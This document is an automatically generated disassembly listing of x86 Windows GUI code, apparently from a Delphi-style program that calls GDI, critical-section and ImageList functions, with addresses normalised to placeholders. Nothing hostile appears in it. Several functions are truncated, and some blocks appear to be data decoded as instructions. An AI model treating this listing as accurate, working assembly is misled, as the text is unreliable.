sub_41a31c
mov al 0x1
retn
sub_41a320
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_41a328
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_41a3d0
xor eax eax
retn
sub_41a3d4
retn
sub_41a400
retn
sub_41a498
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_41a4ac
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_413de8
retn
sub_41a5f3
jmp sub_4036f8
sub_41a5f8
mov ebx 0x1
call sub_403a60
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a65b
jmp sub_4036f8
sub_41a660
mov ebx 0x80030103
call sub_403a60
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a6de
jmp sub_4036f8
sub_41a6e3
mov ebx 0x80030009
call sub_403a60
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_41a741
jmp sub_4036f8
sub_41a746
mov ebx 0x8000ffff
call sub_403a60
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a911
jmp sub_4039ac
sub_41a922
jmp sub_4036f8
sub_41a927
mov [ ebp - 0x4 ] 0x8000ffff
call sub_403a60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a950
lea eax [ ebp + 0xc ]
call sub_4056c4
retn
sub_41a949
jmp sub_4039ac
sub_41a950
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_41a95c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_41a968
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_41a974
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41a980
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41a9ef
jmp sub_4036f8
sub_41a9f4
mov esi 0x8000ffff
call sub_403a60
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41aa08
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_41aa75
jmp sub_4039ac
sub_41aa7c
mov eax [ rw-data ]
call sub_403258
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41aa8c
call sub_413734
retn
sub_41ab54
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_41acf8
jmp sub_4039ac
sub_41acff
pop ebp
retn
sub_41ad8d
jmp sub_4039ac
sub_41ad94
pop ebp
retn
sub_41b095
jmp sub_4039ac
sub_41b09c
pop ebp
retn
sub_41b0a0
sub [ rw-data ] 0x1
retn
sub_41b8c7
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax ] 0x0
int3
sub_41bade
inc ecx
add ah ah
hlt
sub_41c088
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_41c0fc
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_41c170
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_41c17c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41c25c
jmp sub_4039ac
sub_41c263
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c2f3
jmp sub_4039ac
sub_41c385
jmp sub_4039ac
sub_41c38c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c3f0
jmp sub_4039ac
sub_41c3f7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41c45f
jmp sub_4039ac
sub_41c466
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41c509
jmp sub_4039ac
sub_41c510
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c968
push 0x33
mov ecx rw-data
call sub_4139f4
retn
sub_41c978
push 0x33
mov ecx rw-data
call sub_4139b4
retn
sub_41c988
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41c9ac
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_41cb80
push 0x11
mov ecx rw-data
call sub_4139b4
retn
sub_41ccc0
push ebx
mov ebx eax
mov eax ebx
call sub_41c988
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_41cd7a
jmp sub_4039ac
sub_41cd81
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c9ac
retn
sub_41cd97
jmp sub_4039ac
sub_41cdb0
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41ce0d
jmp sub_4039ac
sub_41ce14
pop ebx
pop ecx
pop ebp
retn
sub_41cf8d
jmp sub_4039ac
sub_41cfb5
jmp sub_4039ac
sub_41cfbc
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41d028
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_40420c
pop esi
pop ebx
retn
sub_41d09c
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_41cff8
push eax
call MulDiv
neg eax
pop ebx
retn
sub_41d0d8
mov eax [ eax + 0x10 ]
mov dl [ eax + 0x19 ]
mov eax edx
retn
sub_41d110
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_41d140
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_41d25e
jmp sub_4039ac
sub_41d265
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c9ac
retn
sub_41d27b
jmp sub_4039ac
sub_41d2f1
jmp sub_4039ac
sub_41d2f8
pop ebx
pop ecx
pop ebp
retn
sub_41d2fc
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_41d3b2
jmp sub_4039ac
sub_41d3c4
push esi
cmp dl [ eax + 0x18 ]
je r-xdata
pop esi
retn
mov [ eax + 0x18 ] dl
mov si 0xfffd
call sub_403454
sub_41d3d8
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_41d408
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_41d517
jmp sub_4039ac
sub_41d51e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c9ac
retn
sub_41d534
jmp sub_4039ac
sub_41d5ad
jmp sub_4039ac
sub_41d5b4
pop ebx
pop ecx
pop ebp
retn
sub_41d6e5
jmp sub_4039ac
sub_41d6f8
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_41da38
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_41dc14
jmp sub_4039ac
sub_41dc1b
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_41dc24
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_41dc5c
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41dc68
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41dda8
retn
sub_41de71
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_41de88
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41df74
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41df94
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41dfb4
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41dfd4
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
call sub_4039e4
pop ebx
retn
sub_41dfec
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
call sub_4039e4
pop ebx
retn
sub_41e010
mov eax [ rw-data ]
call sub_41dfec
retn
sub_41e072
jmp sub_4039ac
sub_41e079
pop ecx
pop ebp
retn
sub_41e118
jmp sub_4039ac
sub_41e11f
pop ebx
mov esp ebp
pop ebp
retn
sub_41e1f1
jmp sub_4039ac
sub_41e282
jmp sub_4039ac
sub_41e289
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e2b4
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_41e39b
jmp sub_4039ac
sub_41e548
jmp sub_4039ac
sub_41e54f
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_41e761
jmp sub_4039ac
sub_41e768
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_41e802
jmp sub_4039ac
sub_41e9de
jmp sub_4039ac
sub_41ea98
jmp sub_4039ac
sub_41ea9f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eabf
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41eab8
jmp sub_4039ac
sub_41eabf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41ec4d
jmp sub_4039ac
sub_41ee18
jmp sub_4039ac
sub_41ee1f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ee42
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_4026dc
retn
sub_41ee3b
jmp sub_4039ac
sub_41ee42
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ee62
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_4026dc
retn
sub_41ee5b
jmp sub_4039ac
sub_41ee62
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_41ee6c
xor ecx ecx
mov edx eax
add eax 0x14
jmp r-xdata
cmp edx eax
jl r-xdata
xor cx [ edx ]
add edx 0x2
mov eax ecx
retn
sub_41efcc
push 0x0
call sub_41ef68
retn
sub_41f071
jmp sub_4039ac
sub_41f078
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41f084
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_41efd4
pop ebx
pop ebp
retn 0x4
sub_41f098
retn
sub_41f09c
test eax eax
jne r-xdata
retn
call sub_41f098
sub_41f26f
jmp sub_4039ac
sub_41f296
jmp sub_4039ac
sub_41f29d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f2dc
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_41f4a9
mov eax [ ebp - 0xc ]
call sub_403258
retn
sub_41f4b2
jmp sub_4039ac
j_sub_41f4a9
jmp sub_41f4a9
sub_41f4b9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403258
retn
sub_41f4cf
jmp sub_4039ac
sub_41f4e0
xor eax eax
retn
sub_41f4e4
mov al [ eax + 0x21 ]
retn
sub_41f530
jmp sub_4039ac
sub_41f537
pop esi
pop ecx
pop ebp
retn
sub_41f564
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_41f5bb
jmp sub_4039ac
sub_41f5c2
pop esi
pop ecx
pop ebp
retn
sub_41f5c8
retn
sub_41f5cc
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_41f5dc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_41f761
jmp sub_4039ac
sub_41f768
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_41f887
jmp sub_4039ac
sub_41f88e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41f91f
jmp sub_4039ac
sub_41f926
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f9ae
jmp sub_4039ac
sub_41f9b5
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41fb3f
jmp sub_4039ac
sub_41fb46
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41fcfc
jmp sub_4036f8
sub_41fd20
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f684
mov [ rw-data ] eax
sub_41fd40
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fc0c
mov [ rw-data ] eax
sub_41fe68
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_41fe04
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_41ff10
jmp sub_4036f8
sub_41fff3
jmp sub_4036f8
sub_420054
jmp sub_4039ac
sub_42005b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420064
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_41fe68
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
pop ebx
retn
sub_42007c
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_41fe68
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop edi
pop esi
retn
sub_4201c5
jmp sub_4036f8
sub_420243
jmp sub_4039ac
sub_42024a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4203e4
retn
sub_420584
cmp [ eax + 0x28 ] 0x0
sete al
retn
sub_420888
jmp sub_4039ac
sub_42088f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420a07
jmp sub_4039ac
sub_420a0e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420a9d
jmp sub_4039ac
sub_420aa4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420ac6
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fcc
retn
sub_420abf
jmp sub_4039ac
sub_420ac6
pop ebx
mov esp ebp
pop ebp
retn
sub_420ad9
add [ eax ] al
add [ ebx + 0x74002878 ] al
adc al [ eax + 0x74002c78 ]
pop es
call sub_420dc0
jmp r-xdata
retn
sub_420aef
call sub_420e4c
retn
sub_420be4
retn
sub_420e3c
jmp sub_4039ac
sub_420f67
jmp sub_4039ac
sub_420f6e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
sub_420f87
jmp sub_4039ac
sub_42115e
jmp sub_4039ac
sub_421186
jmp sub_4039ac
sub_42118d
mov esp ebp
pop ebp
retn
sub_421204
jmp sub_4039ac
sub_42130c
jmp sub_4039ac
sub_4213f7
jmp sub_4039ac
sub_421404
inc [ eax + 0x4 ]
retn
sub_42157f
jmp sub_4039ac
sub_421930
jmp sub_4039ac
sub_421b7a
jmp sub_4039ac
sub_421ba4
jmp sub_4039ac
sub_421bab
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421bcd
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_421bc6
jmp sub_4039ac
sub_421bd7
jmp sub_4036f8
sub_421c26
jmp sub_4039ac
sub_421e53
jmp sub_4039ac
sub_421e9b
jmp sub_4039ac
sub_422008
jmp sub_4039ac
sub_4220cf
jmp sub_4036f8
sub_422124
mov [ eax + 0x31 ] 0x0
call sub_41f2dc
retn
sub_422375
jmp sub_4039ac
sub_4223e0
jmp sub_4039ac
sub_4223e7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_422458
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_42250c
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_42251c
push ebx
mov ebx eax
mov eax ebx
call sub_4226d4
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_422530
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_42254c
push ebx
mov ebx eax
mov eax ebx
call sub_422734
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_4225a8
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_4226b7
jmp sub_4039ac
sub_4228e8
jmp sub_4039ac
sub_4228ef
pop ebx
pop ecx
pop ebp
retn
sub_42297b
jmp sub_4036f8
sub_4229db
jmp sub_4039ac
sub_4229e2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_422dc3
jmp sub_4039ac
sub_422def
jmp sub_4039ac
sub_422e56
jmp sub_4036f8
sub_422e87
jmp sub_4039ac
sub_422f0c
jmp sub_4036f8
sub_422f11
mov eax [ ebp - 0x38 ]
call sub_403258
call sub_403a0c
call sub_403a60
sub_422f23
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422f40
mov eax [ ebp - 0x18 ]
call sub_4026dc
retn
sub_422f39
jmp sub_4039ac
sub_42308f
jmp sub_4036f8
sub_42335b
jmp sub_4036f8
sub_42343c
mov cl 0x1
call sub_423444
retn
sub_4236f9
add [ eax ] al
add [ ebx ] dh
leave
call sub_423444
retn
sub_42377e
jmp sub_4036f8
sub_423783
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_403a0c
call sub_403a60
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4237d4
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_42390d
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_42393c
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_423950
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_423a69
jmp sub_4036f8
sub_423b1e
jmp sub_4036f8
sub_423b88
jmp sub_4036f8
sub_423bbc
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_423b48
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_423bd4
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41dfd4
retn
mov [ eax + 0x30 ] edx
retn
sub_423bec
retn
sub_423bf0
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41dfd4
retn
mov [ eax + 0x2c ] edx
retn
sub_423c30
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41dfd4
pop ebp
retn 0x4
sub_423c44
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41dfd4
pop ebp
retn 0x4
sub_423c99
jmp sub_4039ac
sub_423ca0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423e54
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_423e60
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_423f0d
jmp sub_4039ac
sub_423f14
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423fff
jmp sub_4036f8
sub_42406b
jmp sub_4039ac
sub_424199
jmp sub_4039ac
sub_4241a0
pop ebp
retn
sub_4242d5
jmp sub_4039ac
sub_4242dc
pop ebp
retn
sub_4242e0
sub [ rw-data ] 0x1
retn
sub_424528
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_413f44
retn
sub_42455c
mov eax [ eax + 0x4 ]
call sub_413de8
retn
sub_42458d
jmp sub_4039ac
sub_424594
pop ebp
retn
sub_424598
sub [ rw-data ] 0x1
retn
ImageList_Create
jmp [ ImageList_Create@IAT ]
ImageList_Destroy
jmp [ __import_lookup_table_12(comctl32:ImageList_Destroy) ]
ImageList_GetImageCount
jmp [ __import_lookup_table_12(comctl32:ImageList_GetImageCount) ]
ImageList_ReplaceIcon
jmp [ ImageList_ReplaceIcon@IAT ]
ImageList_SetBkColor
jmp [ __import_lookup_table_12(comctl32:ImageList_SetBkColor) ]
ImageList_GetBkColor
jmp [ __import_lookup_table_12(comctl32:ImageList_GetBkColor) ]
ImageList_Replace
jmp [ __import_lookup_table_12(comctl32:ImageList_Replace) ]
ImageList_Remove
jmp [ __import_lookup_table_12(comctl32:ImageList_Remove) ]
ImageList_BeginDrag
jmp [ __import_lookup_table_12(comctl32:ImageList_BeginDrag) ]
ImageList_EndDrag
jmp [ ImageList_EndDrag@IAT ]
ImageList_DragEnter
jmp [ __import_lookup_table_12(comctl32:ImageList_DragEnter) ]
ImageList_DragLeave
jmp [ __import_lookup_table_12(comctl32:ImageList_DragLeave) ]
ImageList_DragMove
jmp [ ImageList_DragMove@IAT ]
ImageList_DragShowNolock
jmp [ __import_lookup_table_12(comctl32:ImageList_DragShowNolock) ]
ImageList_GetDragImage
jmp [ __import_lookup_table_12(comctl32:ImageList_GetDragImage) ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ ImageList_Write@IAT ]
ImageList_GetIconSize
jmp [ ImageList_GetIconSize@IAT ]
ImageList_SetIconSize
jmp [ __import_lookup_table_12(comctl32:ImageList_SetIconSize) ]
sub_424689
jmp sub_4039ac
sub_424690
pop ebp
retn
sub_424694
sub [ rw-data ] 0x1
retn
sub_42475b
jmp sub_4039ac
sub_424762
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_424d78
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_424784
mov [ rw-data ] sub_42489c
mov [ rw-data ] sub_42480c
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_424aa0
mov [ rw-data ] sub_424b74
mov [ rw-data ] sub_424c48
retn
sub_424e09
jmp sub_4039ac
sub_424e10
pop ebp
retn
sub_424e14
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_424d78
sub_424e49
jmp sub_4039ac
sub_424e50
pop ebp
retn
sub_424e54
sub [ rw-data ] 0x1
retn
sub_4250e3
add eax 0xffffffd4
jmp sub_425c10
sub_4250eb
add eax 0xffffffd4
jmp sub_425c6c
sub_4250fd
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405798
sub_425107
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4057ac
sub_425296
jmp sub_4039ac
sub_42529d
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4254ad
jmp sub_4039ac
sub_4254b4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425669
jmp sub_4039ac
sub_4256ce
jmp sub_4039ac
sub_4256d5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4257c1
jmp sub_4039ac
sub_4257c8
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4259d8
lea eax [ ebp - 0x30 ]
call sub_403fa8
lea eax [ ebp - 0x20 ]
call sub_403fa8
retn
sub_4259e9
jmp sub_4039ac
j_sub_4259d8
jmp sub_4259d8
sub_4259f0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425aeb
jmp sub_4039ac
sub_425af2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425bef
jmp sub_4039ac
sub_425bf6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425c56
lea eax [ ebp - 0x4 ]
call sub_4056c4
retn
sub_425c5f
jmp sub_4039ac
j_sub_425c56
jmp sub_425c56
sub_425c66
pop ebx
pop ecx
pop ebp
retn
sub_425d01
jmp sub_4039ac
sub_425d08
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_425d14
mov eax [ eax + 0x20 ]
retn
sub_425e43
jmp sub_4039ac
sub_425e4a
pop ebp
retn
sub_425e4c
sub [ rw-data ] 0x1
retn
sub_425e79
jmp sub_4039ac
sub_425e80
pop ebp
retn
sub_425e84
sub [ rw-data ] 0x1
retn
sub_425ebd
jmp sub_4039ac
sub_425ec4
pop ebp
retn
sub_425ec8
sub [ rw-data ] 0x1
retn
sub_4261d5
jmp sub_4039ac
sub_4261dc
pop ebp
retn
sub_4261e0
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_425f2c
sub_4262c0
retn
sub_426334
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_426340
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_42634c
mov edx [ eax ]
call [ edx ]
retn
sub_426354
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_426381
jmp sub_4039ac
sub_426388
pop ebp
retn
sub_42638c
sub [ rw-data ] 0x1
retn
sub_42654b
jmp sub_4039ac
sub_426552
pop ebp
retn
sub_426907
jmp sub_4039ac
sub_42690e
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_426d28
jmp sub_4039ac
sub_426d2f
pop ebp
retn
sub_426d34
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4262c4
mov [ rw-data ] eax
sub_426d75
jmp sub_4039ac
sub_426d7c
pop ebp
retn
sub_426d80
sub [ rw-data ] 0x1
retn
sub_426dad
jmp sub_4039ac
sub_426db4
pop ebp
retn
sub_426db8
sub [ rw-data ] 0x1
retn
sub_426de5
jmp sub_4039ac
sub_426dec
pop ebp
retn
sub_426df0
sub [ rw-data ] 0x1
retn
sub_426e1d
jmp sub_4039ac
sub_426e24
pop ebp
retn
sub_426e28
sub [ rw-data ] 0x1
retn
sub_426e55
jmp sub_4039ac
sub_426e5c
pop ebp
retn
sub_426e60
sub [ rw-data ] 0x1
retn
sub_426e8d
jmp sub_4039ac
sub_426e94
pop ebp
retn
sub_426e98
sub [ rw-data ] 0x1
retn
sub_426ef9
jmp sub_4039ac
sub_426f00
pop ebp
retn
sub_426f04
sub [ rw-data ] 0x1
retn
GetOpenFileNameA
jmp [ __import_lookup_table_13(comdlg32:GetOpenFileNameA) ]
sub_426f39
jmp sub_4039ac
sub_426f40
pop ebp
retn
sub_426f44
sub [ rw-data ] 0x1
retn
sub_426f71
jmp sub_4039ac
